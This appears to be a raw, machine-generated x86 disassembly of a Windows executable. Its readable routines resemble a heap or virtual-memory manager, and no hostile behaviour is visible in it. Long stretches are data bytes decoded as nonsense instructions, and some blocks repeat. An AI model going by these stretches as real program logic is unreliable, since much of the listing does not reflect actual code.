sub_401098
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x7bffbfcb ] bl
pop ebx
inc eax
add [ eax - 0x53ffbfa5 ] dl
xor eax 0x35a00040
inc eax
add [ eax + 0x1c00405b ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
mov ah 0x51
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
dec eax
add [ ebx - 0x7bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x7fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x4fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x5825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x5425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x5025ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x37da0040 ] cl
push ecx
dec eax
add [ ebx - 0x3bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x3fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x4825ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x27da0040 ] cl
push ecx
dec eax
add [ ebx - 0x2bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x2fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x4425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x4025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x3825ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
push esp
imul ebp [ ebp + 0x65 ] 0xa425ff01
push ecx
dec eax
add [ ebx - 0x5fda0040 ] cl
push ecx
dec eax
add [ ebx - 0x63da0040 ] cl
push ecx
dec eax
add [ ebx - 0x67da0040 ] cl
push ecx
dec eax
add [ ebx - 0x6bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x47da0040 ] cl
push ecx
dec eax
add [ ebx - 0x6fda0040 ] cl
push ecx
dec eax
add [ ebx - 0x73da0040 ] cl
push ecx
dec eax
add [ ebx - 0x77da0040 ] cl
push ecx
dec eax
add [ ebx - 0x4bda0040 ] cl
push ecx
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc eax
add [ eax + 0x4035 ] ah
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40341c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x7bffbfcb ] bl
pop ebx
inc eax
add [ eax - 0x53ffbfa5 ] dl
xor eax 0x35a00040
inc eax
add [ eax + 0x1c00405b ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
mov ah 0x51
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
dec eax
add [ ebx - 0x7bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x7fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x4fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x5825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x5425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x5025ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x37da0040 ] cl
push ecx
dec eax
add [ ebx - 0x3bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x3fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x4825ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x27da0040 ] cl
push ecx
dec eax
add [ ebx - 0x2bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x2fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x4425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x4025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x3825ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
push esp
imul ebp [ ebp + 0x65 ] 0xa425ff01
push ecx
dec eax
add [ ebx - 0x5fda0040 ] cl
push ecx
dec eax
add [ ebx - 0x63da0040 ] cl
push ecx
dec eax
add [ ebx - 0x67da0040 ] cl
push ecx
dec eax
add [ ebx - 0x6bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x47da0040 ] cl
push ecx
dec eax
add [ ebx - 0x6fda0040 ] cl
push ecx
dec eax
add [ ebx - 0x73da0040 ] cl
push ecx
dec eax
add [ ebx - 0x77da0040 ] cl
push ecx
dec eax
add [ ebx - 0x4bda0040 ] cl
push ecx
sub_4013a0
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401360
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013f8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013a0
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401440
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401428
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401428
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013f8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013f8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401428
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401544
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401370
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401378
xor eax eax
mov [ ebx ] eax
sub_4015a8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401370
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401370
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401378
xor eax eax
mov [ ebx ] eax
sub_401620
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401378
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401428
mov [ rw-data ] 0x1
sub_4016d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401370
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40176c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401378
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401544
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016d8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401440
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401620
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401428
jmp r-xdata
sub_40187c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015a8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401440
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015a8
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401620
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401440
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016d8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401620
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401428
jmp r-xdata
sub_4019a0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40176c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401440
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401620
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014b0
jmp r-xdata
sub_401a2c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ae2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401380
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
push 0xff8
push 0x0
call sub_401360
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ae9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401390
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401af0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bc6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401388
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401378
mov ebx [ ebx ]
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401398
retn
push rw-data
call sub_401390
sub_401bd0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c34
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c64
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e38
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cb8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c94
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401ce0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bd0
add ebx esi
mov [ rw-data ] 0x6
sub_401d50
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bd0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c34
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019a0
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019a0
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c64
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014b0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cb8
sub_401e38
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d88
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ec0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
